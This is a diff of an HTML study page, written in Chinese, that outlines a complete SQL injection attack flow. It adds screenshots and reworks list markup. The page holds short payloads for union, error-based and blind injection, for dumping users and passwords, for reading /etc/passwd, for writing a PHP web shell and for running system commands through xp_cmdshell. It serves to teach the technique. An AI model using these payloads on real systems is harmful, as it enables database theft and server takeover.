@@ -1219,6 +1219,8 @@
 <a id="__codelineno-0-54" name="__codelineno-0-54" href="#__codelineno-0-54"></a>style AE fill:#6f9,stroke:#090
 <a id="__codelineno-0-55" name="__codelineno-0-55" href="#__codelineno-0-55"></a>style AG fill:#f99,stroke:#c00
 </code></pre></div>
+<p><img alt="Snipaste_2025-04-19_12-51-46" src="./../../png/SQL%E6%B3%A8%E5%85%A5%E5%AE%8C%E6%95%B4%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B%E5%9B%BE/Snipaste_2025-04-19_12-51-46.png" /></p>
+<p><img alt="Snipaste_2025-04-19_12-52-13" src="./../../png/SQL%E6%B3%A8%E5%85%A5%E5%AE%8C%E6%95%B4%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B%E5%9B%BE/Snipaste_2025-04-19_12-52-13.png" /></p>
 <h2 id="_1">流程图说明</h2>
 <ol>
 <li>
@@ -1227,97 +1229,65 @@
 <li>
 <p><strong>注入点探测</strong>：</p>
 </li>
-<li>
+</ol>
 <p>测试URL参数/表单输入</p>
-</li>
-<li>
 <p>添加<code>'</code>、<code>"</code>、<code>\</code>等特殊字符</p>
-</li>
-<li>
-<p><strong>错误判断</strong>：</p>
-</li>
-<li>
+<ol>
+<li><strong>错误判断</strong>：</li>
+</ol>
 <p>直接报错：快速确认注入类型</p>
-</li>
-<li>
 <p>无报错：进入盲注检测流程</p>
-</li>
-<li>
-<p><strong>注入方式选择</strong>：</p>
-</li>
-<li>
+<ol>
+<li><strong>注入方式选择</strong>：</li>
+</ol>
 <p>联合查询注入（有回显）</p>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="o">@@</span><span class="k">version</span><span class="p">,</span><span class="mi">3</span>
 </code></pre></div>
-</li>
-<li>
 <p>报错注入（显示错误信息）</p>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="k">AND</span><span class="w"> </span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="k">version</span><span class="p">()),</span><span class="mi">1</span><span class="p">)</span>
 </code></pre></div>
-</li>
-<li>
 <p>布尔盲注（页面内容差异）</p>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="k">AND</span><span class="w"> </span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">&gt;</span><span class="mi">100</span>
 </code></pre></div>
-</li>
-<li>
 <p>时间盲注（响应延迟）</p>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="k">AND</span><span class="w"> </span><span class="k">IF</span><span class="p">(</span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span><span class="n">SLEEP</span><span class="p">(</span><span class="mi">5</span><span class="p">),</span><span class="mi">0</span><span class="p">)</span>
 </code></pre></div>
-</li>
-<li>
-<p><strong>信息收集阶段</strong>：</p>
-</li>
-<li>
-<p>获取数据库版本：<code>@@version</code></p>
-</li>
-<li>列出数据库：<code>information_schema.schemata</code></li>
-<li>爆表名：<code>information_schema.tables</code></li>
-<li>
-<p>爆列名：<code>information_schema.columns</code></p>
-</li>
-<li>
-<p><strong>数据提取</strong>：</p>
-</li>
-<li>
-<p>常规数据获取：</p>
-</li>
+<ol>
+<li><strong>信息收集阶段</strong>：</li>
 </ol>
+<p>获取数据库版本：<code>@@version</code></p>
+<p>列出数据库：<code>information_schema.schemata</code></p>
+<p>爆表名：<code>information_schema.tables</code></p>
+<p>爆列名：<code>information_schema.columns</code></p>
+<ol>
+<li><strong>数据提取</strong>：</li>
+</ol>
+<p>常规数据获取：</p>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">user</span><span class="p">,</span><span class="n">password</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span>
 </code></pre></div>
-<ul>
-<li>大段数据获取：</li>
-</ul>
+<p>大段数据获取：</p>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="o">#</span><span class="err">用于从服务器文件系统中读取指定文件的内容，并以字符串形式返回</span>
 <a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="n">LOAD_FILE</span><span class="p">(</span><span class="s1">&#39;/etc/passwd&#39;</span><span class="p">)</span>
 </code></pre></div>
 <ol>
-<li>
-<p><strong>权限提升</strong>：</p>
-</li>
-<li>
+<li><strong>权限提升</strong>：</li>
+</ol>
 <p>数据库写文件：</p>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="o">#</span><span class="err">可以将查询结果写入服务器上的文件中</span>
 <a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="k">INTO</span><span class="w"> </span><span class="n">OUTFILE</span><span class="w"> </span><span class="s1">&#39;/var/www/shell.php&#39;</span>
 </code></pre></div>
-</li>
-<li>
 <p>执行系统命令：</p>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="o">#</span><span class="err">在</span><span class="w"> </span><span class="n">MySQL</span><span class="w"> </span><span class="err">中，默认情况下并不提供类似</span><span class="w"> </span><span class="n">MSSQL</span><span class="w"> </span><span class="err">的</span><span class="w"> </span><span class="n">xp_cmdshell</span><span class="w"> </span><span class="err">功能来直接执行系统命令。</span><span class="w"> </span><span class="err">可以通过安装用户自定义函数（</span><span class="n">UDF</span><span class="err">）来实现类似的功能。</span>
 <a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="n">MSSQL</span><span class="p">:</span><span class="w"> </span><span class="n">xp_cmdshell</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">)</span>
 <a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="o">#</span><span class="n">sys_exec</span><span class="p">()</span><span class="w"> </span><span class="err">是由第三方插件</span><span class="w"> </span><span class="n">lib_mysqludf_sys</span><span class="w"> </span><span class="err">提供的函数，允许在</span><span class="w"> </span><span class="n">MySQL</span><span class="w"> </span><span class="err">中执行系统命令</span>
 <a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="n">MySQL</span><span class="p">:</span><span class="w"> </span><span class="n">sys_exec</span><span class="p">()</span>
 </code></pre></div>
-</li>
-<li>
-<p><strong>横向移动</strong>：</p>
-</li>
-<li>
-<p>内网扫描</p>
-</li>
-<li>密码爆破</li>
-<li>漏洞利用</li>
+<ol>
+<li><strong>横向移动</strong>：</li>
 </ol>
+<p>内网扫描</p>
+<p>密码爆破</p>
+<p>漏洞利用</p>
 
 
 
